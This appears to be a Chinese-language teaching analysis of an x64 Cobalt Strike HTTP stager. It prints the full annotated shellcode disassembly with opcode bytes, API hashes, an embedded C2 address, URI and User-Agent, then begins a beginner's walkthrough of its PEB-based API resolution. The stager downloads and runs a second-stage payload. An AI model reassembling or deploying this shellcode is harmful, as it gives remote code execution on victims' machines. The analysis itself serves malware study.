
## 完整sehllcode
```
; =====================================================================

; x64 Cobalt Strike / WinINet HTTP Stager Shellcode

; Size: 0x37E bytes

; Entry: 0x00000000

;

; 说明：

; - 0x000A - 0x00D1 是 API Hash Resolver

; - 使用 PEB 遍历模块，通过 ROR13 Hash 解析 API

; - 主逻辑加载 wininet.dll，连接 C2，下载第二阶段并执行

; - 中间大量区域是内嵌数据，不应线性反汇编为代码

; =====================================================================

  
  

; ---------------------------------------------------------------------

; Entry

; ---------------------------------------------------------------------

  

00000000  FC                    cld

                          ; 清除方向标志，保证 lodsb/stosb 正向执行

  

00000001  48 83 E4 F0           and rsp, 0FFFFFFFFFFFFFFF0h

                          ; x64 栈 16 字节对齐

  

00000005  E8 C8 00 00 00        call loc_get_resolver_base

                          ; call/pop 技巧

                          ; 跳转到主逻辑，同时把下一条地址 0x0A 压栈

                          ; 0x0A 是 API Hash Resolver 起始位置

  
  

; ---------------------------------------------------------------------

; API Hash Resolver

;

; 输入：

;   r10d = 目标 API hash

;

; 输出：

;   rax = 目标 API 地址

;

; 行为：

;   1. 从 PEB 获取已加载模块链表

;   2. 遍历模块

;   3. 计算模块名 hash

;   4. 遍历导出表

;   5. 计算函数名 hash

;   6. module_hash + function_hash == r10d 时，返回该 API 地址

; ---------------------------------------------------------------------

  

api_hash_resolver:

  

0000000A  41 51                 push r9

0000000C  41 50                 push r8

0000000E  52                    push rdx

0000000F  51                    push rcx

00000010  56                    push rsi

                          ; 保存现场

  

00000011  48 31 D2              xor rdx, rdx

  

00000014  65 48 8B 52 60        mov rdx, qword ptr gs:[rdx+60h]

                          ; rdx = PEB

                          ; x64 Windows 中 gs:[0x60] 指向 PEB

  

00000019  48 8B 52 18           mov rdx, qword ptr [rdx+18h]

                          ; rdx = PEB->Ldr

  

0000001D  48 8B 52 20           mov rdx, qword ptr [rdx+20h]

                          ; rdx = PEB_LDR_DATA->InMemoryOrderModuleList

  
  

; ---------------------------------------------------------------------

; 遍历已加载模块

; ---------------------------------------------------------------------

  

resolve_next_module:

  

00000021  48 8B 72 50           mov rsi, qword ptr [rdx+50h]

                          ; rsi = 当前模块 BaseDllName.Buffer

                          ; 即模块名字符串，如 kernel32.dll、ntdll.dll

  

00000025  48 0F B7 4A 4A        movzx rcx, word ptr [rdx+4Ah]

                          ; rcx = 当前模块名长度

  

0000002A  4D 31 C9              xor r9, r9

                          ; r9d = 模块名 hash

  

0000002D  48 31 C0              xor rax, rax

                          ; 清空 rax，后面使用 al

  
  

; ---------------------------------------------------------------------

; 计算模块名 Hash

; 算法：

;   hash = ROR13(hash)

;   hash += upper(char)

; ---------------------------------------------------------------------

  

hash_module_name:

  

00000030  AC                    lodsb

                          ; al = byte ptr [rsi]

                          ; rsi++

  

00000031  3C 61                 cmp al, 61h

                          ; 判断是否 >= 'a'

  

00000033  7C 02                 jl short module_char_upper_done

  

00000035  2C 20                 sub al, 20h

                          ; 小写转大写

  

module_char_upper_done:

  

00000037  41 C1 C9 0D           ror r9d, 0Dh

                          ; ROR13

  

0000003B  41 01 C1              add r9d, eax

                          ; hash += 当前字符

  

0000003E  E2 ED                 loop hash_module_name

                          ; 继续处理模块名

  
  

; ---------------------------------------------------------------------

; 解析当前模块 PE 结构

; ---------------------------------------------------------------------

  

00000040  52                    push rdx

                          ; 保存当前 LDR 模块链表节点

  

00000041  41 51                 push r9

                          ; 保存模块名 hash

  

00000043  48 8B 52 20           mov rdx, qword ptr [rdx+20h]

                          ; rdx = 当前模块 DllBase

  

00000047  8B 42 3C              mov eax, dword ptr [rdx+3Ch]

                          ; eax = IMAGE_DOS_HEADER.e_lfanew

  

0000004A  48 01 D0              add rax, rdx

                          ; rax = IMAGE_NT_HEADERS

  

0000004D  66 81 78 18 0B 02     cmp word ptr [rax+18h], 020Bh

                          ; OptionalHeader.Magic == 0x20B ?

                          ; 0x20B 表示 PE32+，即 x64 PE

  

00000053  75 72                 jne resolve_module_failed

                          ; 不是 x64 PE 则跳过当前模块

  

00000055  8B 80 88 00 00 00     mov eax, dword ptr [rax+88h]

                          ; eax = Export Directory RVA

  

0000005B  48 85 C0              test rax, rax

                          ; 判断导出表是否存在

  

0000005E  74 67                 je resolve_module_failed

  

00000060  48 01 D0              add rax, rdx

                          ; rax = IMAGE_EXPORT_DIRECTORY VA

  

00000063  50                    push rax

                          ; 保存导出表地址

  

00000064  8B 48 18              mov ecx, dword ptr [rax+18h]

                          ; ecx = NumberOfNames

  

00000067  44 8B 40 20           mov r8d, dword ptr [rax+20h]

                          ; r8d = AddressOfNames RVA

  

0000006B  49 01 D0              add r8, rdx

                          ; r8 = AddressOfNames VA

  

0000006E  E3 56                 jrcxz export_names_empty

                          ; 如果没有导出函数名，跳过

  
  

; ---------------------------------------------------------------------

; 遍历导出函数名

; ---------------------------------------------------------------------

  

resolve_next_export_name:

  

00000070  48 FF C9              dec rcx

                          ; 从最后一个导出名称向前遍历

  

00000073  41 8B 34 88           mov esi, dword ptr [r8+rcx*4]

                          ; esi = AddressOfNames[rcx] RVA

  

00000077  48 01 D6              add rsi, rdx

                          ; rsi = 函数名字符串 VA

  

0000007A  4D 31 C9              xor r9, r9

                          ; r9d = 函数名 hash

  

0000007D  48 31 C0              xor rax, rax

                          ; 清空 rax

  
  

; ---------------------------------------------------------------------

; 计算函数名 Hash

; 算法：

;   hash = ROR13(hash)

;   hash += char

; ---------------------------------------------------------------------

  

hash_function_name:

  

00000080  AC                    lodsb

                          ; al = byte ptr [rsi]

                          ; rsi++

  

00000081  41 C1 C9 0D           ror r9d, 0Dh

                          ; ROR13

  

00000085  41 01 C1              add r9d, eax

                          ; hash += 当前字符

  

00000088  38 E0                 cmp al, ah

                          ; ah 为 0

                          ; 判断是否到达字符串 NULL 结尾

  

0000008A  75 F1                 jne hash_function_name

  
  

; ---------------------------------------------------------------------

; 比较 Hash

; ---------------------------------------------------------------------

  

0000008C  4C 03 4C 24 08        add r9, qword ptr [rsp+8]

                          ; r9 = function_hash + module_hash

  

00000091  45 39 D1              cmp r9d, r10d

                          ; 与目标 API hash 比较

  

00000094  75 D8                 jne resolve_next_export_name

                          ; 不匹配则继续下一个导出函数

  
  

; ---------------------------------------------------------------------

; 找到目标 API，解析真实地址

; ---------------------------------------------------------------------

  

00000096  58                    pop rax

                          ; rax = IMAGE_EXPORT_DIRECTORY

  

00000097  44 8B 40 24           mov r8d, dword ptr [rax+24h]

                          ; r8d = AddressOfNameOrdinals RVA

  

0000009B  49 01 D0              add r8, rdx

                          ; r8 = AddressOfNameOrdinals VA

  

0000009E  66 41 8B 0C 48        mov cx, word ptr [r8+rcx*2]

                          ; cx = Ordinal

  

000000A3  44 8B 40 1C           mov r8d, dword ptr [rax+1Ch]

                          ; r8d = AddressOfFunctions RVA

  

000000A7  49 01 D0              add r8, rdx

                          ; r8 = AddressOfFunctions VA

  

000000AA  41 8B 04 88           mov eax, dword ptr [r8+rcx*4]

                          ; eax = Function RVA

  

000000AE  48 01 D0              add rax, rdx

                          ; rax = Function VA

                          ; 此时 rax 即目标 API 地址

  
  

; ---------------------------------------------------------------------

; 恢复现场并跳转到目标 API

; ---------------------------------------------------------------------

  

000000B1  41 58                 pop r8

000000B3  41 58                 pop r8

000000B5  5E                    pop rsi

000000B6  59                    pop rcx

000000B7  5A                    pop rdx

000000B8  41 58                 pop r8

000000BA  41 59                 pop r9

000000BC  41 5A                 pop r10

                          ; 恢复寄存器

  

000000BE  48 83 EC 20           sub rsp, 20h

                          ; 为 Windows x64 调用约定预留 shadow space

  

000000C2  41 52                 push r10

                          ; 构造 API 返回地址/辅助栈数据

  

000000C4  FF E0                 jmp rax

                          ; 跳转到目标 API

  
  

; ---------------------------------------------------------------------

; 当前模块解析失败，继续下一个模块

; ---------------------------------------------------------------------

  

export_names_empty:

  

000000C6  58                    pop rax

                          ; 平衡前面对导出表地址的 push

  

resolve_module_failed:

  

000000C7  41 59                 pop r9

                          ; 恢复模块 hash

  

000000C9  5A                    pop rdx

                          ; 恢复当前 LDR 节点

  

000000CA  48 8B 12              mov rdx, qword ptr [rdx]

                          ; rdx = 下一个模块链表节点

  

000000CD  E9 4F FF FF FF        jmp resolve_next_module

                          ; 继续遍历模块

  
  

; ---------------------------------------------------------------------

; 主逻辑开始

; ---------------------------------------------------------------------

  

loc_get_resolver_base:

  

000000D2  5D                    pop rbp

                          ; rbp = 0x0000000A

                          ; rbp 指向 api_hash_resolver

  
  

; ---------------------------------------------------------------------

; LoadLibraryA("wininet")

; ---------------------------------------------------------------------

  

000000D3  6A 00                 push 0

                          ; 字符串结尾 NULL

  

000000D5  49 BE 77 69 6E 69 6E 65 74 00

                              mov r14, 0074656E696E6977h

                          ; 小端内存为：

                          ; 77 69 6E 69 6E 65 74 00

                          ; "wininet", 0

  

000000DF  41 56                 push r14

                          ; 栈上构造 "wininet"

  

000000E1  49 89 E6              mov r14, rsp

                          ; r14 = &"wininet"

  

000000E4  4C 89 F1              mov rcx, r14

                          ; rcx = lpLibFileName

  

000000E7  41 BA 4C 77 26 07     mov r10d, 0726774Ch

                          ; hash = LoadLibraryA

  

000000ED  FF D5                 call rbp

                          ; LoadLibraryA("wininet")

  
  

; ---------------------------------------------------------------------

; InternetOpenA(NULL, 0, NULL, NULL, 0)

; ---------------------------------------------------------------------

  

000000EF  48 31 C9              xor rcx, rcx

                          ; lpszAgent = NULL

  

000000F2  48 31 D2              xor rdx, rdx

                          ; dwAccessType = 0

  

000000F5  4D 31 C0              xor r8, r8

                          ; lpszProxy = NULL

  

000000F8  4D 31 C9              xor r9, r9

                          ; lpszProxyBypass = NULL

  

000000FB  41 50                 push r8

                          ; dwFlags = 0

  

000000FD  41 50                 push r8

                          ; 栈对齐/占位

  

000000FF  41 BA 3A 56 79 A7     mov r10d, 0A779563Ah

                          ; hash = InternetOpenA

  

00000105  FF D5                 call rbp

                          ; rax = InternetOpenA(NULL, 0, NULL, NULL, 0)

                          ; rax = hInternet

  
  

; ---------------------------------------------------------------------

; 跳转到尾部 call，获取 C2 Host 字符串地址

; ---------------------------------------------------------------------

  

00000107  EB 73                 jmp short loc_call_get_uri

                          ; 先跳到 0x017C / 0x0181 附近

                          ; 通过 call/pop 获取 URI 地址

  
  

; ---------------------------------------------------------------------

; InternetConnectA(

;     hInternet,

;     "192.168.137.129",

;     80,

;     NULL,

;     NULL,

;     INTERNET_SERVICE_HTTP,

;     0,

;     0

; )

; ---------------------------------------------------------------------

  

loc_after_pop_c2:

  

00000109  5A                    pop rdx

                          ; rdx = lpServerName

                          ; 指向尾部字符串 "192.168.137.129"

  

0000010A  48 89 C1              mov rcx, rax

                          ; rcx = hInternet

  

0000010D  41 B8 50 00 00 00     mov r8d, 50h

                          ; r8d = nServerPort = 0x50 = 80

  

00000113  4D 31 C9              xor r9, r9

                          ; r9 = lpszUserName = NULL

  

00000116  41 51                 push r9

                          ; dwContext = 0

  

00000118  41 51                 push r9

                          ; dwFlags = 0

  

0000011A  6A 03                 push 3

                          ; dwService = INTERNET_SERVICE_HTTP

  

0000011C  41 51                 push r9

                          ; lpszPassword = NULL

  

0000011E  41 BA 57 89 9F C6     mov r10d, 0C69F8957h

                          ; hash = InternetConnectA

  

00000124  FF D5                 call rbp

                          ; rax = InternetConnectA(...)

  
  

; ---------------------------------------------------------------------

; 跳转到 call，获取 URI 字符串地址

; ---------------------------------------------------------------------

  

00000126  EB 59                 jmp short loc_call_get_uri

  
  

; ---------------------------------------------------------------------

; HttpOpenRequestA(

;     hConnect,

;     NULL,

;     "/ZWy3",

;     NULL,

;     NULL,

;     NULL,

;     0x84400200,

;     0

; )

; ---------------------------------------------------------------------

  

loc_after_pop_uri:

  

00000128  5B                    pop rbx

                          ; rbx = URI 字符串地址

                          ; URI = "/ZWy3"

  

00000129  48 89 C1              mov rcx, rax

                          ; rcx = hConnect

  

0000012C  48 31 D2              xor rdx, rdx

                          ; rdx = lpszVerb = NULL

                          ; NULL 通常表示 GET

  

0000012F  49 89 D8              mov r8, rbx

                          ; r8 = lpszObjectName = URI

  

00000132  4D 31 C9              xor r9, r9

                          ; r9 = lpszVersion = NULL

  

00000135  52                    push rdx

                          ; dwContext = 0

  

00000136  68 00 02 40 84        push 84400200h

                          ; dwFlags = 0x84400200

                          ; 常见组合：

                          ; INTERNET_FLAG_RELOAD

                          ; INTERNET_FLAG_NO_CACHE_WRITE

                          ; INTERNET_FLAG_KEEP_CONNECTION

                          ; 以及若干缓存/证书相关标志

  

0000013B  52                    push rdx

                          ; lplpszAcceptTypes = NULL

  

0000013C  52                    push rdx

                          ; lpszReferrer = NULL

  

0000013D  41 BA EB 55 2E 3B     mov r10d, 03B2E55EBh

                          ; hash = HttpOpenRequestA

  

00000143  FF D5                 call rbp

                          ; rax = HttpOpenRequestA(...)

  
  

; ---------------------------------------------------------------------

; 保存请求句柄，准备发送 HTTP 请求

; ---------------------------------------------------------------------

  

00000145  48 89 C6              mov rsi, rax

                          ; rsi = hRequest

  

00000148  48 83 C3 50           add rbx, 50h

                          ; rbx 指向后续 HTTP Header / User-Agent 数据

  

0000014C  6A 0A                 push 0Ah

0000014E  5F                    pop rdi

                          ; rdi = 10

                          ; 最多重试 10 次

  
  

; ---------------------------------------------------------------------

; HttpSendRequestA 重试循环

;

; HttpSendRequestA(

;     hRequest,

;     headers,

;     -1,

;     NULL,

;     0

; )

; ---------------------------------------------------------------------

  

loc_send_request:

  

0000014F  48 89 F1              mov rcx, rsi

                          ; rcx = hRequest

  

00000152  48 89 DA              mov rdx, rbx

                          ; rdx = lpszHeaders

                          ; 指向 User-Agent Header

  

00000155  49 C7 C0 FF FF FF FF  mov r8, 0FFFFFFFFFFFFFFFFh

                          ; r8 = dwHeadersLength = -1

                          ; 表示 Header 是 NULL 结尾字符串

  

0000015C  4D 31 C9              xor r9, r9

                          ; r9 = lpOptional = NULL

  

0000015F  52                    push rdx

                          ; 栈参数/占位

  

00000160  52                    push rdx

                          ; 栈参数/占位

  

00000161  41 BA 2D 06 18 7B     mov r10d, 07B18062Dh

                          ; hash = HttpSendRequestA

  

00000167  FF D5                 call rbp

                          ; eax = HttpSendRequestA(...)

  

00000169  85 C0                 test eax, eax

                          ; 判断是否发送成功

  

0000016B  0F 85 9D 01 00 00     jne loc_request_success

                          ; eax != 0，发送成功，跳到下载阶段

  

00000171  48 FF CF              dec rdi

                          ; 重试次数 --

  

00000174  0F 84 8C 01 00 00     je loc_failure

                          ; 重试次数耗尽，进入失败路径

  

0000017A  EB D3                 jmp short loc_send_request

                          ; 否则继续重试

  
  

; ---------------------------------------------------------------------

; 跳转获取尾部 Host 字符串

; ---------------------------------------------------------------------

  

loc_call_get_c2:

  

0000017C  E9 E4 01 00 00        jmp loc_call_host_string

                          ; 跳到尾部，通过 call 将 Host 地址压栈

  
  

; ---------------------------------------------------------------------

; 获取 URI 地址

; ---------------------------------------------------------------------

  

loc_call_get_uri:

  

00000181  E8 A2 FF FF FF        call loc_after_pop_uri

                          ; 将下一地址 0x186 压栈

                          ; loc_after_pop_uri 中 pop rbx 得到 URI 地址

  
  

; ---------------------------------------------------------------------

; Embedded URI

; ---------------------------------------------------------------------

  

embedded_uri:

  

00000186  2F 5A 57 79 33 00     db "/ZWy3", 00h

                          ; URI = "/ZWy3"

  
  

; ---------------------------------------------------------------------

; Embedded / Random / Metadata Data

;

; 注意：

;   下面区域包含配置数据、随机填充、Header 字符串等。

;   不应直接线性反汇编为有效指令。

; ---------------------------------------------------------------------

  

0000018C  D9 1F 49 86 B0 06 16 CC

00000194  50 F2 09 B0 95 35 F5 D5

0000019C  99 E3 38 00 3D 36 09 0E

000001A4  55 88 9F 1D B4 B6 F8 91

000001AC  E1 AC 37 E4 29 F2 71 73

000001B4  C3 54 43 34 06 61 6C 19

000001BC  3A 9D E7 85 CF F7 C9 1F

000001C4  3C 59 0B 0B 83 65 29 3F

000001CC  83 39 1B 19 F1 E0 0C 6E

000001D4  24 00                 db 024h, 000h

                          ; 随机/配置数据结束附近

  
  

; ---------------------------------------------------------------------

; Embedded HTTP Header

; ---------------------------------------------------------------------

  

embedded_user_agent:

  

000001D6  55 73 65 72 2D 41 67 65

000001DE  6E 74 3A 20           db "User-Agent: "

  

000001E2  4D 6F 7A 69 6C 6C 61 2F

000001EA  35 2E 30 20 28 63 6F 6D

000001F2  70 61 74 69 62 6C 65 3B

000001FA  20 4D 53 49 45 20 31 30

00000202  2E 30 3B 20 57 69 6E 64

0000020A  6F 77 73 20 4E 54 20 36

00000212  2E 32 3B 20 57 4F 57 36

0000021A  34 3B 20 54 72 69 64 65

00000222  6E 74 2F 36 2E 30 3B 20

0000022A  4D 41 47 57 4A 53 29 0D

00000232  0A 00                 db "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MAGWJS)", 0Dh, 0Ah, 00h

                          ; 完整 Header:

                          ; User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MAGWJS)\r\n\0

  
  

; ---------------------------------------------------------------------

; More Embedded / Random / Metadata Data

; ---------------------------------------------------------------------

  

00000234  75 60 97 DC BE E2 40 DE

0000023C  1B C2 7B 90 65 BA 03 7D

00000244  6E 44 2C 76 C0 97 F5 6F

0000024C  59 D8 93 DF 81 FE 43 1F

00000254  AA 84 DD 7A 70 65 85 3F

0000025C  D9 24 CD 4F 36 65 1E 59

00000264  EB 43 86 6A 49 59 ED 67

0000026C  C4 33 FB 62 C4 26 5F D7

00000274  33 CC 14 A7 6B 84 0A 11

0000027C  61 F4 85 70 90 CB 11 70

00000284  32 92 1C 7B 04 42 C8 AA

0000028C  94 57 BB 80 C6 81 EF 6C

00000294  B5 A8 08 AD AF 58 70 46

0000029C  84 04 F3 45 B6 A7 B0 71

000002A4  4B 34 C9 C3 AF E2 6F EC

000002AC  58 80 00 2D 4D 59 53 94

000002B4  7F E1 B0 29 45 8F 55 4A

000002BC  5E A8 8D 92 23 BC 7F 59

000002C4  44 18 10 91 D2 B2 B6 23

000002CC  C9 F0 C8 38 AD 75 F0 D9

000002D4  09 41 8D 17 D3 0A C4 D2

000002DC  A3 39 12 CB DA 66 9B 1A

000002E4  52 26 8F AC 09 7E B8 7F

000002EC  41 CE E5 F5 62 D5 5B 96

000002F4  3B E1 55 20 B4 E1 01 63

000002FC  40 A1 7E 66 4D 55 99 B7

00000304  44 00                 db 044h, 000h

                          ; 随机/配置数据结束附近

  
  

; ---------------------------------------------------------------------

; Failure Path

;

; 注意：

;   这里的 41 BE F0 B5 A2 56 从语义上看像失败退出相关逻辑。

;   一些同类 shellcode 中这里常见的是 ExitProcess 的 hash。

;   但原始字节为 41 BE，即 mov r14d, imm32。

;   保留原始反汇编，不强行修正为 r10d。

; ---------------------------------------------------------------------

  

loc_failure:

  

00000306  41 BE F0 B5 A2 56     mov r14d, 056A2B5F0h

                          ; 可疑失败处理 hash / 退出相关 hash

  

0000030C  FF D5                 call rbp

                          ; 调用 resolver/API trampoline

  
  

; ---------------------------------------------------------------------

; Request Success

;

; VirtualAlloc(

;     NULL,

;     0x400000,

;     MEM_COMMIT,

;     PAGE_EXECUTE_READWRITE

; )

; ---------------------------------------------------------------------

  

loc_request_success:

  

0000030E  48 31 C9              xor rcx, rcx

                          ; lpAddress = NULL

  

00000311  BA 00 00 40 00        mov edx, 400000h

                          ; dwSize = 0x400000

  

00000316  41 B8 00 10 00 00     mov r8d, 1000h

                          ; flAllocationType = MEM_COMMIT

  

0000031C  41 B9 40 00 00 00     mov r9d, 40h

                          ; flProtect = PAGE_EXECUTE_READWRITE

  

00000322  41 BA 58 A4 53 E5     mov r10d, 0E553A458h

                          ; hash = VirtualAlloc

  

00000328  FF D5                 call rbp

                          ; rax = VirtualAlloc(NULL, 0x400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE)

  
  

; ---------------------------------------------------------------------

; 初始化第二阶段下载缓冲区

; ---------------------------------------------------------------------

  

0000032A  48 93                 xchg rax, rbx

                          ; rbx = allocated buffer

                          ; rax = old rbx

  

0000032C  53                    push rbx

                          ; 保存 stage 起始地址

  

0000032D  53                    push rbx

                          ; 再次保存 stage 地址 / 作为辅助栈数据

  

0000032E  48 89 E7              mov rdi, rsp

                          ; rdi = &bytesRead

                          ; 使用栈作为 InternetReadFile 的 bytesRead 输出位置

  

00000331  48 89 F1              mov rcx, rsi

                          ; rcx = hRequest

  

00000334  48 89 DA              mov rdx, rbx

                          ; rdx = 当前写入缓冲区地址

  

00000337  41 B8 00 20 00 00     mov r8d, 2000h

                          ; r8d = 每次读取 0x2000 字节

  

0000033D  49 89 F9              mov r9, rdi

                          ; r9 = &bytesRead

  
  

; ---------------------------------------------------------------------

; InternetReadFile 循环

;

; InternetReadFile(

;     hRequest,

;     buffer,

;     0x2000,

;     &bytesRead

; )

; ---------------------------------------------------------------------

  

loc_read_loop:

  

00000340  41 BA 12 96 89 E2     mov r10d, 0E2899612h

                          ; hash = InternetReadFile

  

00000346  FF D5                 call rbp

                          ; eax = InternetReadFile(...)

  

00000348  48 83 C4 20           add rsp, 20h

                          ; 修复 shadow space

  

0000034C  85 C0                 test eax, eax

                          ; 判断 InternetReadFile 是否成功

  

0000034E  74 B6                 je loc_failure+1

                          ; 读取失败则进入失败路径附近

                          ; 注意目标为 0x307，位于 loc_failure 指令内部偏移

                          ; 这是 shellcode 中常见的紧凑写法/非标准控制流

  

00000350  66 8B 07              mov ax, word ptr [rdi]

                          ; ax = bytesRead

  

00000353  48 01 C3              add rbx, rax

                          ; buffer += bytesRead

  

00000356  85 C0                 test eax, eax

                          ; bytesRead 是否为 0

  

00000358  75 D7                 jne loc_read_loop

                          ; bytesRead != 0，继续读取

  

0000035A  58                    pop rax

0000035B  58                    pop rax

0000035C  58                    pop rax

                          ; 取回保存的 stage 起始地址

  

0000035D  48 05 00 00 00 00     add rax, 0

                          ; stage 地址无偏移调整

  

00000363  50                    push rax

                          ; 将 stage 地址压栈

  

00000364  C3                    ret

                          ; ret 到 stage

                          ; 等价于执行下载下来的第二阶段 payload

  
  

; ---------------------------------------------------------------------

; 获取 Host 字符串地址

; ---------------------------------------------------------------------

  

loc_call_host_string:

  

00000365  E8 9F FD FF FF        call loc_after_pop_c2

                          ; 将下一地址 0x36A 压栈

                          ; loc_after_pop_c2 中 pop rdx 得到 Host 地址

  
  

; ---------------------------------------------------------------------

; Embedded C2 Host

; ---------------------------------------------------------------------

  

embedded_c2_host:

  

0000036A  31 39 32 2E 31 36 38 2E

00000372  31 33 37 2E 31 32 39 00

                              db "192.168.137.129", 00h

                          ; C2 Host = 192.168.137.129

  
  

; ---------------------------------------------------------------------

; Tail bytes

; ---------------------------------------------------------------------

  

0000037A  27 BC 86 AA           db 027h, 0BCh, 086h, 0AAh

                          ; 尾部数据 / 填充 / 校验相关数据

```




## 一、概述

本文档分析一段 **894 字节（0x37E）** 的 x64 shellcode，它属于 Cobalt Strike 框架的 **HTTP Stager**（分阶段加载器）。其核心功能是：

1. 不依赖任何导入表，通过 **PEB 遍历 + ROR13 哈希** 动态解析 Windows API
2. 加载 `wininet.dll`，建立 HTTP 连接到 C2 服务器
3. 下载第二阶段 payload 并直接执行

> **初学者提示**：Stager 是"分阶段加载"的意思——先运行一小段代码（stager），它的唯一任务是从远程服务器下载真正的恶意代码（payload），然后执行。这样做的好处是初始投递的体积非常小，只有 894 字节。

---

## 二、整体架构

从宏观上看，这段 shellcode 可以分为以下几个区域：

```
┌─────────────────────────────────────────────────────┐
│  0x000 - 0x004   Entry（入口点）                      │
├─────────────────────────────────────────────────────┤
│  0x00A - 0x0C4   API Hash Resolver（API哈希解析器）    │
├─────────────────────────────────────────────────────┤
│  0x0D2 - 0x364   主逻辑（Main Logic）                 │
│    ├─ LoadLibraryA("wininet")                        │
│    ├─ InternetOpenA(...)                             │
│    ├─ InternetConnectA(...)                          │
│    ├─ HttpOpenRequestA(...)                          │
│    ├─ HttpSendRequestA(...) [重试循环]                │
│    ├─ VirtualAlloc(...)                              │
│    ├─ InternetReadFile(...) [下载循环]                │
│    └─ ret → 执行第二阶段 payload                      │
├─────────────────────────────────────────────────────┤
│  0x186 - 0x37D   内嵌数据区                           │
│    ├─ URI 字符串 "/ZWy3"                             │
│    ├─ 随机/配置数据                                   │
│    ├─ User-Agent Header                              │
│    ├─ 更多随机/配置数据                                │
│    └─ C2 Host "192.168.137.129"                     │
└─────────────────────────────────────────────────────┘
```

> **初学者提示**：shellcode 是一段"裸"代码，没有 PE 头、没有导入表，所有依赖的 Windows API 都要靠自己找到。这就是为什么它需要一个"API 解析器"。

---

## 三、逐段详解

### 3.1 入口点（Entry）：0x000 - 0x004

```asm
00000000  FC                    cld                    ; 清除方向标志
00000001  48 83 E4 F0           and rsp, 0FFFFFFFFFFFFFFF0h  ; 栈16字节对齐
00000005  E8 C8 00 00 00        call loc_get_resolver_base    ; call/pop技巧
```

**逐行解释：**

- **`cld`**：清除方向标志位（Direction Flag）。这保证了后续使用 `lodsb` 等字符串操作指令时，指针是**递增**的。这是一个防御性操作——你不知道调用者是否设置了方向标志。

- **`and rsp, 0FFFFFFFFFFFFFFF0h`**：将栈指针与 `0xFFFFFFFFFFFFFFF0` 做与运算，效果是把 rsp 的最低 4 位清零，使其 **16 字节对齐**。Windows x64 调用约定要求调用 API 前栈必须 16 字节对齐，否则会触发异常。

- **`call loc_get_resolver_base`**：这是经典的 **call/pop 技巧**。`call` 指令会把下一条指令的地址（即 `0x0A`）压入栈中，然后跳转到 `0x0D2`。在 `0x0D2` 处，`pop rbp` 会把这个地址弹出到 rbp，这样 rbp 就指向了 API Hash Resolver 的起始位置。

> **初学者提示**：为什么不用 `mov rbp, 0x0A`？因为 shellcode 不知道自己会被加载到哪个地址，硬编码地址是不可靠的。call/pop 技巧利用了 **相对地址**——`call` 使用的是相对偏移，无论 shellcode 被加载到哪里都能正确工作。

---

### 3.2 API Hash Resolver（API 哈希解析器）：0x00A - 0x0C4

这是整个 shellcode 最核心、最精巧的部分。它的作用是：**给定一个 API 函数的哈希值，在内存中找到该函数的真实地址**。

#### 3.2.1 保存现场

```asm
0000000A  41 51                 push r9
0000000C  41 50                 push r8
0000000E  52                    push rdx
0000000F  51                    push rcx
00000010  56                    push rsi
```

将当前寄存器值压栈保存，因为解析过程会修改这些寄存器。调用者通过 `rcx, rdx, r8, r9` 传递了 API 参数，这些值不能丢失。

#### 3.2.2 获取 PEB，定位已加载模块链表

```asm
00000011  48 31 D2              xor rdx, rdx
00000014  65 48 8B 52 60        mov rdx, qword ptr gs:[rdx+60h]  ; rdx = PEB
00000019  48 8B 52 18           mov rdx, qword ptr [rdx+18h]     ; rdx = PEB->Ldr
0000001D  48 8B 52 20           mov rdx, qword ptr [rdx+20h]     ; rdx = InMemoryOrderModuleList
```

**什么是 PEB？**

PEB（Process Environment Block，进程环境块）是 Windows 为每个进程维护的一个数据结构，里面包含了进程的各种信息。其中一项关键信息是：**当前进程加载了哪些 DLL**。

在 x64 Windows 中：
- `gs:[0x60]` 指向 PEB
- `PEB + 0x18` 指向 `PEB_LDR_DATA` 结构
- `PEB_LDR_DATA + 0x20` 指向 `InMemoryOrderModuleList`——这是一个**双向链表**，链表中每个节点代表一个已加载的 DLL

> **初学者提示**：为什么从 PEB 获取模块列表而不是直接调用 `GetModuleHandle`？因为 shellcode 没有导入表，无法直接调用任何 API。PEB 地址可以通过段寄存器 `gs` 直接获取，不需要任何 API 调用。

#### 3.2.3 遍历模块，计算模块名哈希

```asm
; 获取模块名和长度
00000021  48 8B 72 50           mov rsi, qword ptr [rdx+50h]     ; rsi = BaseDllName.Buffer
00000025  48 0F B7 4A 4A        movzx rcx, word ptr [rdx+4Ah]    ; rcx = 模块名长度

; 初始化哈希值
0000002A  4D 31 C9              xor r9, r9    ; r9d = 模块名哈希（初始为0）
0000002D  48 31 C0              xor rax, rax  ; 清空 rax

; 哈希计算循环
hash_module_name:
00000030  AC                    lodsb          ; al = [rsi], rsi++
00000031  3C 61                 cmp al, 61h    ; 是否 >= 'a'
00000033  7C 02                 jl short skip
00000035  2C 20                 sub al, 20h    ; 小写转大写
skip:
00000037  41 C1 C9 0D           ror r9d, 0Dh   ; 循环右移13位（ROR13）
0000003B  41 01 C1              add r9d, eax   ; 哈希 += 当前字符
0000003E  E2 ED                 loop hash_module_name
```

**ROR13 哈希算法**的步骤：
1. 取模块名的一个字符
2. 如果是小写字母，转为大写
3. 将当前哈希值**循环右移 13 位**
4. 将字符值加到哈希上
5. 重复直到处理完所有字符

> **初学者提示**：ROR13 是一种简单的哈希算法，不是加密。它的目的是把函数名（如 `"LoadLibraryA"`）压缩成一个 32 位数字，这样 shellcode 只需要存储一个数字，而不是整个字符串，节省空间且避免明文字符串被检测。

#### 3.2.4 解析 PE 导出表

找到模块后，需要解析其 PE 结构来获取导出函数：

```asm
00000043  48 8B 52 20           mov rdx, qword ptr [rdx+20h]  ; rdx = DllBase（模块基址）
00000047  8B 42 3C              mov eax, dword ptr [rdx+3Ch]  ; eax = e_lfanew（NT头偏移）
0000004A  48 01 D0              add rax, rdx                   ; rax = NT头地址
0000004D  66 81 78 18 0B 02     cmp word ptr [rax+18h], 020Bh  ; 检查是否为PE32+（x64）
00000053  75 72                 jne resolve_module_failed       ; 不是x64则跳过
00000055  8B 80 88 00 00 00     mov eax, dword ptr [rax+88h]   ; eax = 导出目录RVA
0000005B  48 85 C0              test rax, rax                   ; 导出表是否存在
0000005E  74 67                 je resolve_module_failed
00000060  48 01 D0              add rax, rdx                   ; rax = 导出目录VA
```

**PE 结构解析流程：**

```
DllBase → DOS Header → e_lfanew → NT Headers
                                        ├─ OptionalHeader.Magic == 0x20B? (确认是x64)
                                        └─ Export Directory RVA → + DllBase = VA
```

